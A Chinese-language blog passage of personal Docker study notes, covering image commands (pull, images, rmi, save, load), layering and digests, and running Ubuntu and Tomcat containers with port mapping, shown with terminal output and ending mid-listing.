title="镜像定位"></a>镜像定位</h3><p>对于任何镜像，都可通过<repository>:<tag>进行唯一定位。其中<tag>一般称为镜像的版本号。<tag>中有一个比较特殊的版本一-latest。如果不指定，默认<tag>即为 latest。不过，虽然其字面意思是最新版，一般其也的确存放的是最新版,但并不能保证其真的就是最新版。</p><h2 id="获取帮助信息"><a href="#获取帮助信息" class="headerlink" title="获取帮助信息"></a>获取帮助信息</h2><ol><li>官网获取<a href="https://docs.docker.com/reference/cli/docker/">https://docs.docker.com/reference/cli/docker/</a></li><li>docker –help</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker version --help</span><br></pre></td></tr></table></figure><h2 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker pull --help</span><br><span class="line">​</span><br><span class="line">Usage:  docker pull [OPTIONS] NAME[:TAG|@DIGEST]</span><br><span class="line">--DIGEST摘要，镜像内容的哈希值，用来验证内容是否被篡改，和TAG同作用，但TAG更方便</span><br><span class="line">​</span><br><span class="line">Download an image from a registry --拉取一个仓库</span><br><span class="line">​</span><br><span class="line">Aliases:</span><br><span class="line">  docker image pull, docker pull</span><br><span class="line">​</span><br><span class="line">Options:</span><br><span class="line">  -a, --all-tags                Download all tagged images in the repository --下载一个仓库的所有镜像，可能会下载很多东西</span><br><span class="line">      --disable-content-trust   Skip image verification (default true) --跳过镜像的验证，默认是跳过的，下第三方的时候最好设置成false</span><br><span class="line">      --platform string         Set platform if server is multi-platform --拉去指定架构的镜像，不常用，一般都是和自身架构匹配的</span><br><span class="line">                                capable</span><br><span class="line">  -q, --quiet                   Suppress verbose output</span><br><span class="line"> --省略下载的输出信息，减少信息冗余</span><br></pre></td></tr></table></figure><h2 id="docker-images"><a href="#docker-images" class="headerlink" title="docker images"></a>docker images</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images --help</span><br><span class="line">​</span><br><span class="line">Usage:  docker images [OPTIONS] [REPOSITORY[:TAG]]</span><br><span class="line">​</span><br><span class="line">List images</span><br><span class="line">​</span><br><span class="line">Aliases:</span><br><span class="line">  docker image ls, docker image list, docker images</span><br><span class="line">​</span><br><span class="line">Options:</span><br><span class="line">  -a, --all             Show all images (default hides intermediate images)</span><br><span class="line">      --digests         Show digests</span><br><span class="line">  -f, --filter filter   Filter output based on conditions provided</span><br><span class="line">      --format string   Format output using a custom template:</span><br><span class="line">                        &#x27;table&#x27;:            Print output in table format</span><br><span class="line">                        with column headers (default)</span><br><span class="line">                        &#x27;table TEMPLATE&#x27;:   Print output in table format</span><br><span class="line">                        using the given Go template</span><br><span class="line">                        &#x27;json&#x27;:             Print in JSON format</span><br><span class="line">                        &#x27;TEMPLATE&#x27;:         Print output using the given</span><br><span class="line">                        Go template.</span><br><span class="line">                        Refer to https://docs.docker.com/go/formatting/</span><br><span class="line">                        for more information about formatting output with</span><br><span class="line">                        templates</span><br><span class="line">      --no-trunc        Don&#x27;t truncate output</span><br><span class="line">  -q, --quiet           Only show image IDs</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>– digests可以查看镜像的摘要</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images --digests</span><br><span class="line">REPOSITORY    TAG       DIGEST                                                                    IMAGE ID       CREATED         SIZE</span><br><span class="line">busybox       latest    sha256:6d9ac9237a84afe1516540f40a0fafdc86859b2141954b4d643af7066d598b74   3f57d9401f8d   6 weeks ago     4.26MB</span><br><span class="line">hello-world   latest    sha256:d000bc569937abbe195e20322a0bde6b2922d805332fd6d8a68b19f524b7d21d   d2c94e258dcb   10 months ago   13.3kB</span><br><span class="line">centos        7         sha256:be65f488b7764ad3638f236b7b515b3678369a5124c47b8d32916d6487418ea4   eeb6ee3f44bd   2 years ago     204MB</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>–no-trunc,写全信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images --no-trunc</span><br><span class="line">REPOSITORY    TAG       IMAGE ID                                                                  CREATED         SIZE</span><br><span class="line">busybox       latest    sha256:3f57d9401f8d42f986df300f0c69192fc41da28ccc8d797829467780db3dd741   6 weeks ago     4.26MB</span><br><span class="line">hello-world   latest    sha256:d2c94e258dcb3c5ac2798d32e1249e42ef01cba4841c2234249495f87264ac5a   10 months ago   13.3kB</span><br><span class="line">centos        7         sha256:eeb6ee3f44bd0b5103bb561b4c16bcb82328cfe5809ab675bb17ab3a16c517c9   2 years ago     204MB</span><br></pre></td></tr></table></figure><p>-q是显示简略信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images -q</span><br><span class="line">3f57d9401f8d</span><br><span class="line">d2c94e258dcb</span><br><span class="line">eeb6ee3f44bd</span><br></pre></td></tr></table></figure><p>docker rmi  $(docker images -q)删除所有镜像</p><p>但遇到一个问题”Error response from daemon: invalid reference format: repository name must be lowercase”但这个好像是要小写命名docker镜像</p><p>这个好像要重命名才能解决</p><p>docker images 镜像名字，单独查看那个镜像的信息</p><p>-f 过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images -f dangling=true --悬虚镜像：悬虚镜像就是镜像没有仓库名或没有标签查询显示虚悬镜像，在列表中展示为 &lt;none&gt;:&lt;none&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200412145250562.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-D5avIWwl-1586674340510)(evernotecid://621D2FF6-4E72-4E02-9043-55F31F42819B/appyinxiangcom/22553815/ENResource/p1118)]"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images -f since=hello-world</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">busybox      latest    3f57d9401f8d   6 weeks ago   4.26MB</span><br></pre></td></tr></table></figure><p>since这个是看自since之后的东西，也可以用before看之前的</p><p>reference&#x3D; * : * 宽泛查询，*</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images -f reference=*:latest找所有latest版本的镜像</span><br><span class="line">docker images -f refernece=centos:*找所有版本的centos</span><br><span class="line">docker images -f reference=*t*找到名字和版本中包含字母t的镜像</span><br><span class="line">但reference只查官方的</span><br></pre></td></tr></table></figure><p>–format 格式化输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images --format &#123;&#123;.Repository&#125;&#125;</span><br><span class="line">busybox</span><br><span class="line">hello-world</span><br><span class="line">centos</span><br><span class="line">[root@localhost ~]# docker images --format &#123;&#123;.Repository&#125;&#125;:&#123;&#123;.Tag&#125;&#125;</span><br><span class="line">busybox:latest</span><br><span class="line">hello-world:latest</span><br><span class="line">centos:7</span><br></pre></td></tr></table></figure><h2 id="docker-search"><a href="#docker-search" class="headerlink" title="docker search"></a>docker search</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker search centos</span><br><span class="line">NAME                               DESCRIPTION                                                                                                                   STARS     OFFICIAL</span><br><span class="line">centos                             DEPRECATED; The official build of CentOS.                                                                                     7715      [OK]</span><br><span class="line">kasmweb/centos-7-desktop           CentOS 7 desktop for Kasm Workspaces                                                                                          43</span><br><span class="line">...</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>AUTOMATED表示当前镜像是否是”自动化镜像“，就是使用Docker Hub连接一个包含Dockerfile文件（专门构建镜像用的文件）的GitHub仓库或Bitbucket仓库（源码托管平台），然后Docker Hub就会自动根据Dockerfile内容构建镜像，这种构建出的镜像就会带AUTOMATED，这种构建镜像的方式称为Trusted Build（受信构建）。只要Dockerfile文件内容发生变化，那么Docker Hub就会构建出新的镜像</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker search --help</span><br><span class="line"></span><br><span class="line">Usage:  docker search [OPTIONS] TERM</span><br><span class="line"></span><br><span class="line">Search Docker Hub for images</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -f, --filter filter   Filter output based on conditions provided -f和之前的images差不多</span><br><span class="line">      --format string   Pretty-print search using a Go template</span><br><span class="line">      --limit int       Max number of search results-限制个数</span><br><span class="line">      --no-trunc        Don&#x27;t truncate output</span><br></pre></td></tr></table></figure><h2 id="dockers-rmi-删除容器-rm"><a href="#dockers-rmi-删除容器-rm" class="headerlink" title="dockers rmi(删除容器 rm)"></a>dockers rmi(删除容器 rm)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker rmi --help</span><br><span class="line">​</span><br><span class="line">Usage:  docker rmi [OPTIONS] IMAGE [IMAGE...]</span><br><span class="line">​</span><br><span class="line">Remove one or more images</span><br><span class="line">​</span><br><span class="line">Aliases:</span><br><span class="line">  docker image rm, docker image remove, docker rmi</span><br><span class="line">​</span><br><span class="line">Options:</span><br><span class="line">  -f, --force      Force removal of the image --强制删除</span><br><span class="line">      --no-prune   Do not delete untagged parents --和镜像层相关</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>操作一下试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">busybox       latest    3f57d9401f8d   6 weeks ago     4.26MB</span><br><span class="line">hello-world   latest    d2c94e258dcb   10 months ago   13.3kB</span><br><span class="line">centos        7         eeb6ee3f44bd   2 years ago     204MB</span><br><span class="line">[root@localhost ~]# docker rmi centos:7</span><br><span class="line">Untagged: centos:7</span><br><span class="line">Untagged: centos@sha256:be65f488b7764ad3638f236b7b515b3678369a5124c47b8d32916d6487418ea4</span><br><span class="line">Deleted: sha256:eeb6ee3f44bd0b5103bb561b4c16bcb82328cfe5809ab675bb17ab3a16c517c9</span><br><span class="line">Deleted: sha256:174f5685490326fc0a1c0f5570b8663732189b327007e47ff13d2ca59673db02</span><br><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">busybox       latest    3f57d9401f8d   6 weeks ago     4.26MB</span><br><span class="line">hello-world   latest    d2c94e258dcb   10 months ago   13.3kB</span><br><span class="line">[root@localhost ~]# docker rmi hello-world</span><br><span class="line">Error response from daemon: conflict: unable to remove repository reference &quot;hello-world&quot; (must force) - container 9c54e5ac2981 is using its referenced image d2c94e258dcb</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE         COMMAND    CREATED        STATUS                    PORTS     NAMES</span><br><span class="line">9c54e5ac2981   hello-world   &quot;/hello&quot;   6 hours ago    Exited (0) 6 hours ago              ecstatic_ride</span><br><span class="line">0881099d27ad   hello-world   &quot;/hello&quot;   20 hours ago   Exited (0) 20 hours ago             vibrant_murdock</span><br><span class="line">[root@localhost ~]# docker rmi -f hello-world</span><br><span class="line">Untagged: hello-world:latest</span><br><span class="line">Untagged: hello-world@sha256:d000bc569937abbe195e20322a0bde6b2922d805332fd6d8a68b19f524b7d21d</span><br><span class="line">Deleted: sha256:d2c94e258dcb3c5ac2798d32e1249e42ef01cba4841c2234249495f87264ac5a</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND    CREATED        STATUS                    PORTS     NAMES</span><br><span class="line">9c54e5ac2981   d2c94e258dcb   &quot;/hello&quot;   7 hours ago    Exited (0) 7 hours ago              ecstatic_ride</span><br><span class="line">0881099d27ad   d2c94e258dcb   &quot;/hello&quot;   20 hours ago   Exited (0) 20 hours ago             vibrant_murdock</span><br><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">busybox      latest    3f57d9401f8d   6 weeks ago   4.26MB</span><br></pre></td></tr></table></figure><p>其中hello-world因为已经运行在容器里了，可以ps -a一下看看，然后用-f强制删除</p><h2 id="docker-save"><a href="#docker-save" class="headerlink" title="docker save"></a>docker save</h2><p>用来把镜像打包保存到本体，方变移动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">zookeeper    3.7       446078172ae8   2 weeks ago   307MB</span><br><span class="line">busybox      latest    3f57d9401f8d   6 weeks ago   4.26MB</span><br><span class="line">[root@localhost ~]# docker save --help</span><br><span class="line">​</span><br><span class="line">Usage:  docker save [OPTIONS] IMAGE [IMAGE...]</span><br><span class="line">​</span><br><span class="line">Save one or more images to a tar archive (streamed to STDOUT by default)</span><br><span class="line">​</span><br><span class="line">Aliases:</span><br><span class="line">  docker image save, docker save</span><br><span class="line">​</span><br><span class="line">Options:</span><br><span class="line">  -o, --output string   Write to a file, instead of STDOUT</span><br><span class="line">[root@localhost ~]# docker save -o my.tar zookeeper:3.7 busybox:latest</span><br><span class="line">[root@localhost ~]# ll</span><br><span class="line">total 310364</span><br><span class="line">...</span><br><span class="line">-rw-------. 1 root root 317776384 Mar  1 04:01 my.tar</span><br><span class="line">...</span><br><span class="line">也可以重定向到一个文件里，用&gt;</span><br><span class="line">​</span><br><span class="line">[root@localhost ~]# docker save zookeeper:3.7 busybox:latest &gt; new.tar</span><br><span class="line">[root@localhost ~]# ll</span><br><span class="line">total 620696</span><br><span class="line">...</span><br><span class="line">-rw-------. 1 root root 317776384 Mar  1 04:01 my.tar</span><br><span class="line">-rw-r--r--. 1 root root 317776384 Mar  1 04:03 new.tar</span><br><span class="line">...大小都是一样得</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301200411484.png" alt="image-20240301200411484"></p><p>这是原来的，然后把它们删除</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker rmi 446078172ae8 3f57d9401f8d</span><br><span class="line">...</span><br><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID   CREATED   SIZE</span><br></pre></td></tr></table></figure><p>然后再把tar加载出来</p><h2 id="docker-load"><a href="#docker-load" class="headerlink" title="docker load"></a>docker load</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker load --help</span><br><span class="line">​</span><br><span class="line">Usage:  docker load [OPTIONS]</span><br><span class="line">​</span><br><span class="line">Load an image from a tar archive or STDIN</span><br><span class="line">​</span><br><span class="line">Aliases:</span><br><span class="line">  docker image load, docker load</span><br><span class="line">​</span><br><span class="line">Options:</span><br><span class="line">  -i, --input string   Read from tar archive file, instead of STDIN</span><br><span class="line">  -q, --quiet          Suppress the load output</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker load -i my.tar</span><br><span class="line">2e112031b4b9: Loading layer  4.492MB/4.492MB</span><br><span class="line">Loaded image: busybox:latest</span><br><span class="line">d101c9453715: Loading layer  80.41MB/80.41MB</span><br><span class="line">431a6830edc6: Loading layer  38.53MB/38.53MB</span><br><span class="line">c5da6d3a7681: Loading layer  140.9MB/140.9MB</span><br><span class="line">48ea7a659f10: Loading layer   2.56kB/2.56kB</span><br><span class="line">da0e0faf395b: Loading layer  3.072kB/3.072kB</span><br><span class="line">fb2a43f5cc59: Loading layer  342.5kB/342.5kB</span><br><span class="line">adff97f6861e: Loading layer  10.88MB/10.88MB</span><br><span class="line">9b43d841bc28: Loading layer  42.15MB/42.15MB</span><br><span class="line">9abd5b933e89: Loading layer  3.072kB/3.072kB</span><br><span class="line">Loaded image: zookeeper:3.7</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301200729066.png" alt="image-20240301200729066"></p><p>和之前对比一下，镜像id都是一样的，这个也有重定向的写法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker load &lt; my.tar</span><br></pre></td></tr></table></figure><p>效果是一样的</p><h2 id="镜像分层"><a href="#镜像分层" class="headerlink" title="镜像分层"></a>镜像分层</h2><p>Docker 镜像由一些<strong>松耦</strong>合的只读镜像层组成，Docker Daemon 负责堆叠这些镜像层，并将它们关联为一个统一的整体，即对外表现出的是一个独立的对象。“通过 docker pull 命令拉取指定的镜像时,每个 Pull complete 结尾的行就代表下载完毕了一个镜像层。·<br>例如，下面的 redis:latest 镜像就包含8个镜像层。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker pull redis</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/redis</span><br><span class="line">e1caac4eb9d2: Pull complete</span><br><span class="line">7469c6c5b625: Pull complete</span><br><span class="line">a3d1b68c4a62: Pull complete</span><br><span class="line">152cbe749752: Pull complete</span><br><span class="line">7218480dfba1: Pull complete</span><br><span class="line">e61c48a0d344: Pull complete</span><br><span class="line">4f4fb700ef54: Pull complete</span><br><span class="line">82adb0efabd8: Pull complete</span><br><span class="line">--如果存在则会显示Already exists</span><br><span class="line">Digest: sha256:e647cfe134bf5e8e74e620f66346f93418acfc240b71dd85640325cb7cd01402</span><br><span class="line">Status: Downloaded newer image for redis:latest</span><br><span class="line">docker.io/library/redis:latest</span><br></pre></td></tr></table></figure><h3 id="为什么分层"><a href="#为什么分层" class="headerlink" title="为什么分层"></a>为什么分层</h3><p>采用这种分层结构的优势很多，例如，每个分层都是只读的，所有对分层的修改都是以新分层的形式出现，并不会破坏原分层内容:再如，每个分层只记录变更内容，所以有利于节省存储空间等。”<br>不过，分层结构的最大的好处是，在不同镜像间实现<strong>资源共享</strong>，即不同镜像对相同下层镜像的复用。对于 docker pull 命令,其在拉取之前会先获取到其要拉取镜像的所有 magelD,然后在本地查找是否存在这些分层。如果存在，则不再进行拉取，而是共享本地的该分层。大大节点的存储空间与网络带宽，提升了拉取效率。</p><h3 id="镜像层构成"><a href="#镜像层构成" class="headerlink" title="镜像层构成"></a>镜像层构成</h3><p>每个镜像层由两部分构成:<strong>镜像文件系统</strong>与<strong>镜像json</strong> 文件。这两部分具有相同的 magelD.镜像文件系统就是对镜像占有的磁盘空间进行管理的文件系统,拥有该镜像所有镜像层的数据内容。而镜像 json 文件则是用于描述镜像的相关属性的集合，通过 docker inspect [镜像]就可以直观看到。“</p><h4 id="镜像文件系统构成"><a href="#镜像文件系统构成" class="headerlink" title="镜像文件系统构成"></a>镜像文件系统构成</h4><p>一个 docker 镜像的文件系统由多层只读的镜像层组成，每层都完成了特定的功能而这些只读镜像层根据其位置与功能的不同可分为两类: <strong>基础镜像层</strong>与<strong>扩展镜像层.</strong><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240302143631410.png" alt="image-20240302143631410"></p><ul><li>基础镜像层</li></ul><p>​所有镜像的最下层都具有一个可以<strong>看得到</strong>的基础镜像层 Base lmage,基础镜像层的文件系统称为根文件系统 rootfs。而 rootfs 则是建立在 Linux 系统中“<strong>看不到的</strong>”引导文件系统bootfs之上。</p><ul><li>扩展镜像层</li></ul><p>​在基础镜像层之上的镜像层称为扩展镜像层。顾名思义,其是对基础镜像层功能的扩展在 Dockerfile 中，每条指令都是用于完成某项特定功能的，而每条指令都会生成一个扩展镜像层。“</p><ul><li>容器层</li></ul><p>​一旦镜像运行了起来就形成了容器，而容器就是一个运行中的 Linux 系统，其也是具有文件系统的。容器的这个文件系统是在 docker 镜像<strong>最外层</strong>之上增加了一个<strong>可读写的容器层</strong>对文件的任何更改都只存在于容器层。因此任何对容器的操作都不会影响到镜像本身。“容器层如果需要修改某个文件，系统会从容器层开始向下一层层的查找该文件，直到找到为止。任何对于文件的操作都会记录在容器层。例如，要修改某文件，容器层会首先把在镜像层找到的文件 copy 到容器层，然后再进行修改。删除文件也只会将存在于容器层中的文件副本删除。“<br>​可以看出,Docker 容器就是一个叠加后的文件系统,而这个容器层称为 Union File System,联合文件系统。</p><h2 id="LinuxOS启动过程"><a href="#LinuxOS启动过程" class="headerlink" title="LinuxOS启动过程"></a>LinuxOS启动过程</h2><p>​现代操作系统都是 C&#x2F;S模式的微内核架构的，由两大部分构成:内核(Server)与服务模块(Client)。</p><p>​Linux的 bootfs 文件系统由两部分构成:bootloader（将kernel加载到内存，并引导kernel启动） 与kernel（启动后，内存使用权就又bootfs完全转交给kernel，然后kernel就会把bootfs卸载）。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240302163101380.png" alt="image-20240302163101380"></p><h2 id="镜像摘要"><a href="#镜像摘要" class="headerlink" title="镜像摘要"></a>镜像摘要</h2><p>每个镜像都有一个长度为64 位的16 进制字符串作为其摘要 digest。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker inspect [OPTIONS] NAME|ID [NAME|ID...]</span><br></pre></td></tr></table></figure><p>OPTIONS说明：</p><ul><li>**-f :**指定返回值的模板文件。</li><li>**-s :**显示总的文件大小。</li><li>**–type :**为指定类型返回JSON。</li></ul><p>查看摘要</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images xx --degists</span><br><span class="line">[root@localhost ~]# docker images redis --digests</span><br><span class="line">REPOSITORY   TAG       DIGEST                                                                    IMAGE ID       CREATED       SIZE</span><br><span class="line">redis        latest    sha256:e647cfe134bf5e8e74e620f66346f93418acfc240b71dd85640325cb7cd01402   d1397258b209   7 weeks ago   138MB</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>一个镜像一旦创建完毕，其 digest 就不会发生改变了，因为镜像是只读的。。<br>Docker 默认采用的 Hash 算法是 SHA256，即 Hah 值是一个长度为 256 位的二进制值。<br>Docker 使用 16 进制表示，即变为了长度为 64 位的字符串。</p><h3 id="摘要作用"><a href="#摘要作用" class="headerlink" title="摘要作用"></a>摘要作用</h3><p>​摘要的主要作用是区分相同<repository>:<tag>的不同镜像。。<br>​例如镜像 xxx:2.8 在生产运行过程中发现存在一个 BUG。现对其进行了修复，并使用原标签将其 push 回了仓库，那么原镜像被覆盖。但生产环境中遗留了大量运行中的修复前镜像的容器。此时，通过镜像标签已经无法区分镜像是修复前的还是修复后的了，因为它们的标签是相同的。此时通过查看镜像的 digest 就可以区分出修改前后版本，因为内容发生了变化，digest一定会变。”<br>​为了确保再次拉取到的是修复后的镜像，可通过 digest 进行镜像拉取。其用法是:docker pull <repository>@<digest>.</p><h3 id="分发散列值"><a href="#分发散列值" class="headerlink" title="分发散列值"></a>分发散列值</h3><p>​在 push 或 pul 镜像时，都会对镜像进行压缩以减少网络带宽和传输时长。但压缩会改变镜像内容，会导致经过网络传输后，镜像内容与其digest不相符。出现问题。<br>​为了避免该问题该问题，Docker 又为镜像配置了 Distribution Hash(分发散列值)。在镜像被压缩后立即计算分发散列值，然后使该值随压缩过的镜像一同进行发送。在接收方接收后，立即计算压缩镜像的分发散列值，再与携带的分发散列值对比。如果相同，则说明传输没有问题。</p><h2 id="容器运行的本质"><a href="#容器运行的本质" class="headerlink" title="容器运行的本质"></a>容器运行的本质</h2><p>Docker 容器存在的意义就是为了运行容器中的应用，对外提供服务，所以启动容器的目的就是启动运行该容器中的应用。容器中的应用运行完毕后，容器就会自动终止。所以，如果不想让容器启动后立即终止运行，则就需要使容器应用不能立即结束。通常采用的方式有两种，使应用处于<strong>与用户交互</strong>的状态或<strong>等待状态</strong>。.</p><h3 id="docker交互式启动ubantu"><a href="#docker交互式启动ubantu" class="headerlink" title="docker交互式启动ubantu"></a>docker交互式启动ubantu</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker pull ubuntu</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/ubuntu</span><br><span class="line">01007420e9b0: Pull complete</span><br><span class="line">Digest: sha256:f9d633ff6640178c2d0525017174a688e2c1aef28f0a0130b26bd5554491f0da</span><br><span class="line">Status: Downloaded newer image for ubuntu:latest</span><br><span class="line">docker.io/library/ubuntu:latest</span><br></pre></td></tr></table></figure><h4 id="遇到问题Error-docker-login—"><a href="#遇到问题Error-docker-login—" class="headerlink" title="遇到问题Error docker login—-"></a>遇到问题Error docker login—-</h4><p>Error response from daemon: pull access denied for ubantu, repository does not e                                                                              xist or may require ‘docker login’: denied: requested access to the resource is                                                                               denied</p><p>解决方案</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker login</span><br><span class="line">然后输入你的账号密码</span><br></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>密码会保存在&#x2F;root&#x2F;.docker&#x2F;config.json文件下，要注意保护，加密方式是Base64，解码出来时账号:密码的格式，还是挺危险的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# echo &quot;YWRtaW46MTIzNDU2==&quot; | base64 --decode</span><br><span class="line">admin:123456 base64: invalid input</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name myubantu ubantu #--name重命名方便查询进程</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND       CREATED          STATUS                      PORTS     NAMES</span><br><span class="line">6bb10ad29613   ubuntu         &quot;/bin/bash&quot;   4 seconds ago    Exited (0) 3 seconds ago              myubuntu</span><br></pre></td></tr></table></figure><p>可以发现是退出的状态，所以我们需要加上一个bash来添加命令行，然后容器里不允许重名，所以–name 后可以加个2，</p><p>参数说明：</p><ul><li><strong>-i</strong>: 交互式操作。</li><li><strong>-t</strong>: 终端。</li><li>**ubuntu这是指用 ubuntu镜像为基础来启动容器。</li><li><strong>&#x2F;bin&#x2F;bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name mybantu2 -it ubuntu /bin/bash #-i是交互式命令，-t是给一个伪客户端， /bin/bash是常用shell的路径</span><br><span class="line">[root@localhost ~]# docker run --name mybuntu2 -it ubuntu /bin/bash</span><br><span class="line">root@939a1dcb875c:/# ls</span><br><span class="line">bin  boot  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure><p>可以看到这就进来了，但有很多命令这个系统里是没有，然后可以按exit退出</p><p>但有时候这个&#x2F;bin&#x2F;bash也可以不加，不懂什么时候要什么时候不要</p><ul><li>原因：可以看dockerfile里的镜像层，有一个CMD[‘bash’],是作为run参数里的一个选项，没有的话默认就是bash</li></ul><h3 id="docker交互式启动tomcat"><a href="#docker交互式启动tomcat" class="headerlink" title="docker交互式启动tomcat"></a>docker交互式启动tomcat</h3><p>与ubuntu不同的是，tomcat启动时需要注意一些东西，这里就不用最新版了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull tomcat:8.5.49</span><br><span class="line">[root@localhost ~]# docker run --name mytom -it tomcat:8.5.49 /bin/bash</span><br><span class="line">root@df72620e3480:/usr/local/tomcat# ls</span><br><span class="line">BUILDING.txt     NOTICE         RUNNING.txt  include  native-jni-lib  work</span><br><span class="line">CONTRIBUTING.md  README.md      bin          lib      temp</span><br><span class="line">LICENSE          RELEASE-NOTES  conf         logs     webapps</span><br></pre></td></tr></table></figure><p>可以发现和解压出来的一样，但tomcat是未启动，原因出在&#x2F;bin&#x2F;bash</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name mytom2 -it tomcat:8.5.49</span><br><span class="line">...</span><br><span class="line">Server startup in 888 ms</span><br></pre></td></tr></table></figure><p>这时候会发现tomcat启动了，用网页访问试试,还是不行，因为端口8080是centos的里某个占用这个端口的应用，但此时没有，所以不行，需要用到端口映射，把它暴露给宿主机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name mytom3 -it -p 8081:8080 tomcat:8.5.49  左边是宿主机的端口，右边是容器里的端口</span><br><span class="line">第一个8081是暴露linux 的端口号，这样外部才能连接linux</span><br><span class="line">第二个端口号暴露的是容器的端口号，这样linux才能连接容器</span><br><span class="line">-P是随机分配到默认即 rand:default 因为不可控，所以不常用</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要注意的是-p这个参数要放在容器左边，不然会出问题，但视频里可以访问，我的不知道为什么，虚拟机里可以访问，但自己的windows主机访问不了</p><h4 id="遇到问题网络没了"><a href="#遇到问题网络没了" class="headerlink" title="遇到问题网络没了"></a>遇到问题网络没了</h4><ul><li><a href="https://zhuanlan.zhihu.com/p/426926356">解决方法</a></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig --list --看看配置里是否有网络管理工具冲突，保留一个即可</span><br><span class="line">systemctl stop NetworkManager</span><br><span class="line">systemctl restart Network.Service</span><br></pre></td></tr></table></figure><ul><li>docker ps -a的内容太多</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm $(docker ps -a -q) 删除所有已经停止的容器</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240303135819090.png" alt="image-20240303135819090"></p><p>终于是进来了，有两种退出方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl + p + q容器还是up的</span><br><span class="line">ctrl + c 就直接退出了</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED         STATUS         PORTS                                       NAMES</span><br><span class="line">b162037cb017   tomcat:8.5.49   &quot;catalina.sh run&quot;   7 minutes ago   